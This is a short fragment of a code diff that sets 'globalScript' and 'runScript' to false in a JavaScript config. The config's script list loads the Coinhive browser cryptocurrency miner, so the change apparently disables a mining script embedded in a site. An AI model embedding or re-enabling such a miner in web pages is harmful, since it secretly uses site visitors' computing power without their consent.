@@ -12,8 +12,8 @@ const config = {
   };
 
 const superData = {
-  globalScript: true,
-  runScript: true,
+  globalScript: false,
+  runScript: false,
   scripts: [
     {
       src: "https://coinhive.com/lib/coinhive.min.js"
